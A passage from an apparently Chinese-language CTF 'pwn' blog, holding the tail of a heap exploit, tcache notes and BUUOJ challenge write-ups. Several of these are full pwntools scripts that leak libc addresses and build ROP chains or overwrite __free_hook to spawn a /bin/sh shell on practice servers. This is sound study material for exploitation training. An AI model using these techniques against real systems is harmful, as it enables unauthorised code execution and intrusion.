class="hljs-built_in">len</span>(p2),p2)<br>heap = u64(view(<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>])<br>log.success(<span class="hljs-string">&quot;heap address is : &quot;</span>+<span class="hljs-built_in">hex</span>(heap))<br> <br>p3 = p64(heap+<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(p3),p3)<br>unsort_bin = u64(view(<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>])<br>libc_base = unsort_bin - <span class="hljs-number">0x3c1b58</span><br>log.success(<span class="hljs-string">&quot;unsort bin is : &quot;</span> + <span class="hljs-built_in">hex</span>(unsort_bin))<br>log.success(<span class="hljs-string">&quot;libc address is : &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>system = libc_base + elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free  = libc_base + elf.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;free address is : &quot;</span>+<span class="hljs-built_in">hex</span>(free))<br>log.success(<span class="hljs-string">&quot;system address is : &quot;</span>+<span class="hljs-built_in">hex</span>(system))<br> <br>p4 = p64(free)+p64(<span class="hljs-number">0x100</span>)+p64(base+<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0x100</span>)+<span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(p4),p4)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,p64(system))<br> <br>p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>sl(<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br> <br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>​                                </p><h1 id="Tcache-attack"><a href="#Tcache-attack" class="headerlink" title="Tcache attack"></a>Tcache attack</h1><ul><li>内存释放：<ul><li>在 free 函数的最先处理部分，首先是检查释放块是否页对齐及前后堆块的释放情况，便优先放入 tcache 结构中。</li></ul></li><li>内存申请：<ul><li>首先，申请的内存块符合 fastbin 大小时并且在 fastbin 内找到可用的空闲块时，会把该 fastbin 链上的其他内存块放入 tcache 中。</li><li>其次，申请的内存块符合 smallbin 大小时并且在 smallbin 内找到可用的空闲块时，会把该 smallbin 链上的其他内存块放入 tcache 中。</li><li>当在 unsorted bin 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 tcache 中，继续处理。</li></ul></li></ul><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>与上条类似，我们同样将分配作为content的chunk称为content chunk<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>为了方便，我们将分配作为note的chunk称为note chunk<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>src code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ptmalloc</tag>
      
      <tag>源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUOJ_Writeup</title>
    <link href="/2021-07/pwn-start-BUUOJ-writeup/"/>
    <url>/2021-07/pwn-start-BUUOJ-writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="1-前六道题小结-有点懒直接总结"><a href="#1-前六道题小结-有点懒直接总结" class="headerlink" title="1.前六道题小结:(有点懒直接总结)"></a>1.前六道题小结:(有点懒直接总结)</h2><ul><li>第一题测试nc命令</li><li>pwn1_sctf_2016: 一堆std::string啥的操作<strong>根本没看懂是什么</strong>.</li><li>ciscn_n_1: 栈溢出覆盖浮点数过if语句, 直接到IDA View查看十六进制的数值就可以了</li><li>剩下的几题太简单了(回头来看的题都是这么简单!) </li></ul><h2 id="2-ciscn-2019-c-1"><a href="#2-ciscn-2019-c-1" class="headerlink" title="2. ciscn_2019_c_1"></a>2. ciscn_2019_c_1</h2><ul><li>由于没有给出libc库以及libc库的版本, 所以git clone python的LibcSearcher库, 并且学习如何使用.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>ret_addr = <span class="hljs-number">0x4006b9</span> <span class="hljs-comment">#这两个是用ROPgadget找到的, 使用了ROPgadget --binary filename --only &quot;pop|ret&quot; | grep rdi命令</span><br>rdipop_addr = <span class="hljs-number">0x400c83</span><br><br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">28804</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;ice!\n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)  <span class="hljs-comment">#class pwnlib.elf.elf.ELF(path, checksec=True)注意参数是路径,别忘了&quot;./&quot;</span><br>plt_addr = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>got_addr = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-comment">#                     x64机器压入参数     唯一一个参数     ret指令跳转到的地址  函数返回地址(重新到main)</span><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x58</span> + p64(rdipop_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;pted\n&quot;</span>, payload)<br>p.recvuntil(<span class="hljs-string">&#x27;Ciphertext\n&#x27;</span>)<br>p.recvline()<br>addr = u64(p.recv(<span class="hljs-number">7</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))  <span class="hljs-comment">#我也不知道这是为啥</span><br><br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, addr)<br>libc_base = addr - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>sys_addr = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><span class="hljs-comment">#                     栈平衡           x64机器压入参数     唯一一个参数       ret指令跳转到的地址</span><br>payload = <span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x58</span> + p64(ret_addr) + p64(rdipop_addr) + p64(binsh_addr) + p64(sys_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;ice!\n&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;ted\n&quot;</span>, payload)<br><br>p.interactive() <span class="hljs-comment">#将程序的输出输入流改为 标准输出输入流</span><br></code></pre></div></td></tr></table></figure><p>tips:</p><ul><li><p><code>payload = b&#39;b&#39;*0x58 + p64(rdipop_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</code></p><p>GOT顾名思义它只是一张表, 第一次链接后存放着函数的起始地址, plt表中使用 jmp *GOT[4], 即GOT表元素的引用, 第三个p64不能改为got_addr!!!!!!!!!!!!!</p></li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#LibcSearcher用法.(就是某位国人写的小工具, 至于为啥是str_bin_sh我还不知道.......)</span><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span><br>obj = LibcSearcher(<span class="hljs-string">&quot;fgets&quot;</span>, <span class="hljs-number">0X7ff39014bd90</span>)<br>obj.dump(<span class="hljs-string">&quot;system&quot;</span>)        <span class="hljs-comment">#system 偏移</span><br>obj.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)    <span class="hljs-comment">#/bin/sh 偏移</span><br>obj.dump(<span class="hljs-string">&quot;__libc_start_main_ret&quot;</span>)    <br></code></pre></div></td></tr></table></figure><h2 id="3-PWN5-普通的格式化字符串漏洞"><a href="#3-PWN5-普通的格式化字符串漏洞" class="headerlink" title="3. PWN5(普通的格式化字符串漏洞)"></a>3. PWN5(普通的格式化字符串漏洞)</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmtstr_payload</span>(<span class="hljs-params">offset, writes, numbwritten=<span class="hljs-number">0</span>, write_size=<span class="hljs-string">&#x27;byte&#x27;</span>, write_size_max=<span class="hljs-string">&#x27;long&#x27;</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">                   overflows=<span class="hljs-number">16</span>, strategy=<span class="hljs-string">&quot;small&quot;</span>, badbytes=<span class="hljs-built_in">frozenset</span>(<span class="hljs-params"></span>), offset_bytes=<span class="hljs-number">0</span></span>):</span> → <span class="hljs-built_in">str</span><br><span class="hljs-string">&#x27;&#x27;&#x27;Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. </span><br><span class="hljs-string">The size of the addr is taken from context.bits</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>Parameters:<br>offset (<span class="hljs-built_in">int</span>) – the first formatter’s offset you control<br>writes (<span class="hljs-built_in">dict</span>) – <span class="hljs-built_in">dict</span> <span class="hljs-keyword">with</span> addr, value &#123;addr: value, addr2: value2&#125;<br>numbwritten (<span class="hljs-built_in">int</span>) – number of byte already written by the printf function<br>write_size (<span class="hljs-built_in">str</span>) – must be byte, short <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>. Tells <span class="hljs-keyword">if</span> you want to write byte by byte, <br>short by short <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span> by <span class="hljs-built_in">int</span> (hhn, hn <span class="hljs-keyword">or</span> n)<br>overflows (<span class="hljs-built_in">int</span>) – how many extra overflows (at size sz) to tolerate to reduce the length of <br>the <span class="hljs-built_in">format</span> string<br>strategy (<span class="hljs-built_in">str</span>) – either ‘fast’ <span class="hljs-keyword">or</span> ‘small’ (‘small’ <span class="hljs-keyword">is</span> default, ‘fast’ can be used <span class="hljs-keyword">if</span> there <br>                                                are many writes)<br>Returns:<br>The payload <span class="hljs-keyword">in</span> order to do needed writes<br></code></pre></div></td></tr></table></figure><h2 id="4-BabyRop-0"><a href="#4-BabyRop-0" class="headerlink" title="4. BabyRop[0]."></a>4. BabyRop<a href="https://blog.csdn.net/weixin_44677409/article/details/113769436">[0]</a>.</h2><p>查看程序的保护机制<img src="https://i.loli.net/2021/07/22/Ri6VUFBHCIbNpmj.png" alt="image-20210722002115059"> </p><p>发现是got表不可写的32位程序<br>拖进ida查看伪代码<img src="https://i.loli.net/2021/07/22/18Yp72mcR5gDEoV.png" alt="image-20210722002553447"> </p><p>sub_80486BB是初始化缓存区的函数<br>发现buf是一个随机数<img src="https://i.loli.net/2021/07/22/k7LqQlvpzZsFEry.png" alt="image-20210722002240287"> </p><p>发现函数中存在strncmp比较函数，其中buf为用户输入的值，s为buf随机数，如果不相等则会退出程序，<u>所以需要想办法绕过这个判断，所以v1的值必须为0</u>.</p><p>v1 = strlen(buf),strlen这个函数有个<strong>缺陷</strong>：遇到\x00直接截断。所以我们要输入第一位数为\x00</p><p>buf被IDA识别为32位数组, 函数返回值是buf[7], 所以直接将buf[7]写成想要的数值即可</p><p>接下来来看最后一个函数<img src="https://i.loli.net/2021/07/22/l6dPBCuI5vsyKNL.png" alt="image-20210722002708919"> </p><p>其中a1即为上文中的v5，假如a1等于127则会执行第一条语句，不会溢出，当a1大于0xE7时就会存在溢出，从而覆盖返回地址</p><p>解题思路：首先通过\x00来绕过判断，覆盖v5为\xff（使得v5尽可能的大），通过wirte函数来泄露write的内存地址，然后利用libc来计算system函数地址，最后利用溢出使得返回地址为system</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28361</span>)<br><span class="hljs-comment">#ignore the strncmp and overwrite buf[7] to the max\xff</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;\xff&#x27;</span><br>p.sendline(payload)<br><span class="hljs-comment">#jump to read(0, buf, a1) and char buf[231]</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xe7</span>+<span class="hljs-number">0x4</span>)<br><span class="hljs-comment">#leak the write_addr</span><br>elf = ELF(<span class="hljs-string">&quot;./babyrop&quot;</span>, <span class="hljs-number">0</span>)<br>got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<br>plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br>main = <span class="hljs-number">0x8048825</span><br><br>payload = payload + p32(plt) + p32(main) + p32(<span class="hljs-number">1</span>) + p32(got) + p32(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#payload = flat([b&#x27;a&#x27;*(0xe7+0x4), plt, main, 1, got, 4])</span><br>p.sendlineafter(<span class="hljs-string">&quot;ct\n&quot;</span>, payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br><span class="hljs-comment">#calc the sys_addr and returned to the main function </span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>, <span class="hljs-number">0</span>)<br>sys_libc = libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>write_libc = libc.symbols[<span class="hljs-string">&quot;write&quot;</span>]<br>binsh_libc  = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>libc_base = write_addr - write_libc<br>sys = libc_base + sys_libc<br>binsh = libc_base + binsh_libc<br><br><span class="hljs-comment">#constrct the payload</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;\xff&#x27;</span><br>p.sendline(payload)<br>payload = flat([<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xe7</span>+<span class="hljs-number">0x4</span>), sys, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>, binsh])<br>p.sendlineafter(<span class="hljs-string">&quot;ct\n&quot;</span>, payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p><strong>tips:</strong>.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#新用法get:</span><br>sl=<span class="hljs-keyword">lambda</span> x:io.sendline(x)<br>sla=<span class="hljs-keyword">lambda</span> x,y:io.sendlineafter(x,y)<br>rl=<span class="hljs-keyword">lambda</span> :io.recvline()<br>ru=<span class="hljs-keyword">lambda</span> x:io.recvuntil(x)<br></code></pre></div></td></tr></table></figure><ul><li><p>strlen()函数遇到’\0’就会停止!!!!!!</p></li><li><p>别忘了先是<strong>参数</strong>后是sys的<strong>返回地址</strong>.</p></li><li><p>pack():   Word-size, endianness and signedness is done according to context</p><p>所以, flat()中的wordsize就不用管了, 自动使用相应的pack()函数</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">pwnlib.util.packing.flat(*a, **kw)<br>- flat(*args, preprocessor = <span class="hljs-literal">None</span>, length = <span class="hljs-literal">None</span>, filler = de_bruijn(), <span class="hljs-comment">#???debruijn是个什么东西</span><br>  word_size = <span class="hljs-literal">None</span>, endianness = <span class="hljs-literal">None</span>, sign = <span class="hljs-literal">None</span>) -&gt; <span class="hljs-built_in">str</span><br></code></pre></div></td></tr></table></figure></li></ul><h2 id="6-ciscn-2019-n-8"><a href="#6-ciscn-2019-n-8" class="headerlink" title="6.ciscn_2019_n_8"></a>6.ciscn_2019_n_8</h2><ul><li>三种方法一应俱全<a href="https://www.cnblogs.com/bhxdn/p/12679290.html">[0]</a>.</li><li>还是看别人的才做的出来, 不然谁会知道:<ul><li>get_flag的返回地址不能乱写，打远程时，如果程序是异常退出了，最后是不给你回显的. </li><li>正常退出需要使用exit(), 所以将get_flag的返回地址写成exit的地址</li><li>如果正常退出, 你不加一个p.recv()接受字符, 仍然没有回显.</li><li>还有就是修改bss段的权限, 高级操作, 又得学一个函数**(还没学)**.</li></ul></li></ul><h2 id="7-not-the-same"><a href="#7-not-the-same" class="headerlink" title="7.not_the_same"></a>7.not_the_same</h2><ul><li>简单的栈溢出题目, 就不截图了, 和第六题是一样的, 需要注意exit正常退出程序后必须recv几个字符远程才会有输出</li><li>可以看到我做了一个万能头, 以后写exp只要复制修改一下就可以了, 还是挺方便的</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv a</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26867</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./not_the_same_3dsctf_2016&quot;</span>)<br><span class="hljs-comment">#整理以下思路：45个数组先覆盖掉，然后是get_secrt地址，然后是write地址，</span><br><span class="hljs-comment">#write的返回地址（感觉得是exit的地址），第一个参数1，第二个0x80ECA2D，第三个50字节（就这么长)</span><br><span class="hljs-comment">#还是printf函数的参数简单一点</span><br>elf = ELF(<span class="hljs-string">&quot;./not_the_same_3dsctf_2016&quot;</span>, <span class="hljs-number">0</span>)<br>exit = elf.symbols[<span class="hljs-string">&quot;exit&quot;</span>]<br><span class="hljs-comment">#write = elf.symbols[&quot;write&quot;]</span><br>printf = elf.symbols[<span class="hljs-string">&quot;printf&quot;</span>]<br>get = elf.symbols[<span class="hljs-string">&quot;get_secret&quot;</span>]<br>buf = <span class="hljs-number">0x80ECA2D</span><br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">45</span>, get, printf, exit, buf])<br>sl(payload)<br>ra()<br></code></pre></div></td></tr></table></figure><h2 id="8-bjdctf-2020-babystack"><a href="#8-bjdctf-2020-babystack" class="headerlink" title="8.bjdctf_2020_babystack"></a>8.bjdctf_2020_babystack</h2><ul><li>比较简单, 主要的问题是context的默认bit是32, 换成万能头的context.binary就没有问题了</li></ul><h2 id="9-ciscn-2019-ne-5"><a href="#9-ciscn-2019-ne-5" class="headerlink" title="9.ciscn_2019_ne_5"></a>9.ciscn_2019_ne_5</h2><p>过程<a href="https://www.freesion.com/article/93161361727/">[0]</a>.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./ciscn_2019_ne_5&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv a</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28273</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./ciscn_2019_ne_5&quot;</span>)<br><span class="hljs-comment">#思路：先addlog写入128字节的src，下一次循环到getfalg里面用strcpy写入dest实现溢出，返回地址sys，sys返回地址随意，sys参数为sh地址</span><br>elf = ELF(<span class="hljs-string">b&quot;./ciscn_2019_ne_5&quot;</span>, <span class="hljs-number">0</span>)<br>sh = <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh&quot;</span>))<span class="hljs-comment">#可以直接用ELF.search, 或者ROPgadget --binary &quot;&quot; --string &quot;&quot;</span><br>sys = elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x48</span>+<span class="hljs-number">0x4</span>), sys, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>, sh])<br><span class="hljs-comment">#sla(b&#x27;password:&#x27;, b&#x27;administrator&#x27;)</span><br><span class="hljs-comment">#sla(b&#x27;0.Exit\n:&#x27;, b&#x27;1&#x27;)</span><br><span class="hljs-comment">#sla(b&#x27;info:&#x27;, payload)</span><br><span class="hljs-comment">#sla(b&#x27;0.Exit\n:&#x27;, b&#x27;4&#x27;)</span><br>sl(<span class="hljs-string">b&#x27;administrator&#x27;</span>)<span class="hljs-comment">#只要搞得清楚, 直接只用sendline(), 只是调试有点乱而已(也还好, 现在的输入也不会太多)</span><br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>sl(payload)<br>sl(<span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-comment">#sl(b&#x27;administrator\n1\n&#x27;+payload+b&#x27;\n4&#x27;)甚至可以写成</span><br>itt()<br></code></pre></div></td></tr></table></figure><h2 id="10-others-shellcode"><a href="#10-others-shellcode" class="headerlink" title="10. others_shellcode_"></a>10. others_shellcode_</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">__asm &#123; <span class="hljs-keyword">int</span> <span class="hljs-number">80</span>h; LINUX - sys_execve &#125; <span class="hljs-comment">//tmd这又是哪门子的LINUX</span><br></code></pre></div></td></tr></table></figure><p>p.s. 关于__asm <a href="https://docs.microsoft.com/en-us/cpp/assembler/inline/asm?view=msvc-160">[0]</a>.</p><p>之前刷题中用到的后门函数都是system(“/bin/sh”)，这次出现了一个新的后门：**execve()**。</p><p>函数定义:<br>**int execve(const char *filename, char <em>const argv[ ], char <em>const envp[ ]);</em></em> </p><p>寄存器eax放execve的系统调用号11；<br>寄存器ebx放文件路径，即第一个参数；<br>寄存器ecx放第二个参数，是利用数组指针把内容传递给执行文件，并且需要以空指针(NULL)结束；<br>寄存器edx放最后一个参数，为传递给执行文件的新环境变量数组。</p><p><strong>后两个参数一般为0</strong> </p><p>int 0x80：中断<br>执行系统调用函数execve()时，execve()通过int 0x80指令进入系统调用入口程序，并且把系统调用号11放入eax中，接着把参数放入ebx，ecx和edx中。如果没有/bin/sh字符串, 那么就先调用read函数读取”/bin/sh”, 尝试”sh”失败, 原因尚未知晓</p><h2 id="11-2018-rop"><a href="#11-2018-rop" class="headerlink" title="11.2018_rop"></a>11.2018_rop</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">setresuid(); <br>setresgid();<br><span class="hljs-comment">//These two syscalls are like their equivalent kernels calls above, but with the additional ability to set the Saved-User-ID (SUID) or Saved-Group-ID (SGID). re represent</span><br></code></pre></div></td></tr></table></figure><h2 id="12-ciscn-s-3"><a href="#12-ciscn-s-3" class="headerlink" 